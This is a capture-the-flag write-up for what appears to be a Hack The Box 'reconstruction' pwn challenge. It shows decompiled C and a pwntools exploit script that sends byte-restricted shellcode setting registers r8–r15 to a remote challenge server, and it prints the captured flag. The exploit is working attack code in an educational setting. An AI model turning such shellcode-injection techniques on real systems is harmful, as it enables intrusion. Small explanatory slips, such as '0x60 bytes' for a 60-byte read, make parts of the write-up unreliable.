Challenge gives us binary file and glibc. Decompile: 

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int buf; // [rsp+3h] [rbp-Dh] BYREF
  char v4; // [rsp+7h] [rbp-9h]
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  banner(argc, argv, envp);
  buf = 0;
  v4 = 0;
  printstr("\n[*] Initializing components...\n");
  sleep(1u);
  puts("\x1B[1;31m");
  printstr("[-] Error: Misaligned components!\n");
  puts("\x1B[1;34m");
  printstr("[*] If you intend to fix them, type \"fix\": ");
  read(0, &buf, 4uLL);
  if ( !strncmp((const char *)&buf, "fix", 3uLL) )
  {
    puts("\x1B[1;33m");
    printstr("[!] Carefully place all the components: ");
    if ( (unsigned __int8)check() )
      read_flag();
    exit(1312);
  }
  puts("\x1B[1;31m");
  printstr("[-] Mission failed!\n\n");
  exit(1312);
}
```

It will execute the `read_flag()` function if we pass the `check()` condition: 

```c
__int64 check()
{
  __int64 rbx0; // rbx
  __int64 v1; // rbx
  __int64 v2; // rbx
  __int64 v3; // rbx
  __int64 v4; // rbx
  __int64 v5; // rax
  unsigned __int8 i; // [rsp+Fh] [rbp-71h]
  _QWORD *addr; // [rsp+10h] [rbp-70h]
  __int64 buf; // [rsp+20h] [rbp-60h] BYREF
  __int64 rbp0x58; // [rsp+28h] [rbp-58h]
  __int64 rbp0x50; // [rsp+30h] [rbp-50h]
  __int64 rbp0x48; // [rsp+38h] [rbp-48h]
  __int64 rbp0x40; // [rsp+40h] [rbp-40h]
  char rbp0x38[13]; // [rsp+48h] [rbp-38h] BYREF
  __int64 rbp0x2b; // [rsp+55h] [rbp-2Bh]
  unsigned __int64 rbp0x18; // [rsp+68h] [rbp-18h]

  rbp0x18 = __readfsqword(0x28u);
  addr = mmap(0LL, 0x3CuLL, 7, 34, -1, 0LL);
  if ( addr == (_QWORD *)-1LL )
  {
    perror("mmap");
    exit(1);
  }
  buf = 0LL;
  rbp0x58 = 0LL;
  rbp0x50 = 0LL;
  rbp0x48 = 0LL;
  rbp0x40 = 0LL;
  memset(rbp0x38, 0, sizeof(rbp0x38));
  rbp0x2b = 0LL;
  read(0, &buf, 60uLL);
  rbx0 = rbp0x58;
  *addr = buf;
  addr[1] = rbx0;
  v1 = rbp0x48;
  addr[2] = rbp0x50;
  addr[3] = v1;
  v2 = *(_QWORD *)rbp0x38;
  addr[4] = rbp0x40;
  addr[5] = v2;
  v3 = rbp0x2b;
  *(_QWORD *)((char *)addr + 45) = *(_QWORD *)&rbp0x38[5];
  *(_QWORD *)((char *)addr + 53) = v3;
  if ( !(unsigned int)validate_payload((__int64)addr, 59uLL) )
  {
    error("Invalid payload! Execution denied.\n");
    exit(1);
  }
  ((void (*)(void))addr)();
  munmap(addr, 0x3CuLL);
  for ( i = 0; i <= 6u; ++i )
  {
    if ( regs((&::buf)[i]) != values[i] )
    {
      v4 = values[i];
      v5 = regs((&::buf)[i]);
      printf(
        "%s\n[-] Value of [ %s$%s%s ]: [ %s0x%lx%s ]%s\n\n[+] Correct value: [ %s0x%lx%s ]\n\n",
        "\x1B[1;31m",
        "\x1B[1;35m",
        (&::buf)[i],
        "\x1B[1;31m",
        "\x1B[1;35m",
        v5,
        "\x1B[1;31m",
        "\x1B[1;32m",
        "\x1B[1;33m",
        v4,
        "\x1B[1;32m");
      return 0LL;
    }
  }
  return 1LL;
}
```

First, it reads 0x60 bytes from buffer, then compares each bytes of buffer to `allowed_bytes` in `validate_payload()` function: 

```c
__int64 __fastcall validate_payload(__int64 a1, unsigned __int64 a2)
{
  int v3; // [rsp+14h] [rbp-1Ch]
  unsigned __int64 i; // [rsp+18h] [rbp-18h]
  unsigned __int64 j; // [rsp+20h] [rbp-10h]

  for ( i = 0LL; i < a2; ++i )
  {
    v3 = 0;
    for ( j = 0LL; j <= 17; ++j )
    {
      if ( *(_BYTE *)(a1 + i) == allowed_bytes[j] )
      {
        v3 = 1;
        break;
      }
    }
    if ( !v3 )
    {
      printf("%s\n[-] Invalid byte detected: 0x%x at position %zu\n", "\x1B[1;31m", *(unsigned __int8 *)(a1 + i), i);
      return 0LL;
    }
  }
  return 1LL;
}
```
The `allowed_bytes` is represented as follow: 

![image](https://hackmd.io/_uploads/rysUGUiV1e.png)

![image](https://hackmd.io/_uploads/HJLvzUsN1g.png)

Then it goes to condition `regs((&::buf)[i]) != values[i]`, compares the return value of `regs` to `value[i]`: 

![image](https://hackmd.io/_uploads/HJg3MIoN1l.png)

![image](https://hackmd.io/_uploads/rJd3zIo4yg.png)

Function `regs()`:
```c
__int64 __fastcall regs(const char *a1)
{
  __int64 v1; // r12
  __int64 v2; // r13
  __int64 v3; // r14
  __int64 v4; // r15
  __int64 v5; // r8
  __int64 v6; // r9
  __int64 v7; // r10
  __int64 v9; // [rsp+10h] [rbp-10h]

  v9 = 0LL;
  if ( !strcmp(a1, "r8") )
    return v5;
  if ( !strcmp(a1, "r9") )
    return v6;
  if ( !strcmp(a1, "r10") )
    return v7;
  if ( !strcmp(a1, "r12") )
    return v1;
  if ( !strcmp(a1, "r13") )
    return v2;
  if ( !strcmp(a1, "r14") )
    return v3;
  if ( !strcmp(a1, "r15") )
    return v4;
  printf("Unknown register: %s\n", a1);
  return v9;
}
```

it will return the value in each register, from `r8` to `r15`, except `r11`. So this is just a simple shellcode challenge. 
Script: 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./reconstruction_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("94.237.49.127", 34849)

    return r


def main():
    r = conn()
    input()
    # allowed_bytes = [0x49, 0xc7, 0xb9, 0xc0, 0xde, 0x37, 0x13, 0xc4, 0xc6, 0xef, 0xbe, 0xad, 0xca, 0xfe, 0xc3, 0x0, 0xba, 0xbd]
    # values = [0x1337c0de, 0xdeadbeef, 0xdead1337, 0x1337cafe, 0xbeefc0de, 0x13371337, 0x1337dead]
    shellcode = asm(
        '''
        mov r8, 0x1337c0de
        mov r9, 0xdeadbeef
        mov r10, 0xdead1337
        mov r12, 0x1337cafe
        mov r13, 0xbeefc0de
        mov r14, 0x13371337
        mov r15, 0x1337dead
        ret
        ''', arch='amd64')
    r.sendlineafter(b'"fix": ', b'fix')
    r.sendafter(b'components: ', shellcode)
    pause()
    # good luck pwning :)

    r.interactive()

# HTB{r3c0n5trucT_d3m_r3g5_b60047af4c6d947566236fc3f700049d}
if __name__ == "__main__":
    main()

```
We must add `ret` in the end, because i think it compares 59 bytes of buffer to `validate_payload`, if it's not has 1 more byte, we will get seg fault. 
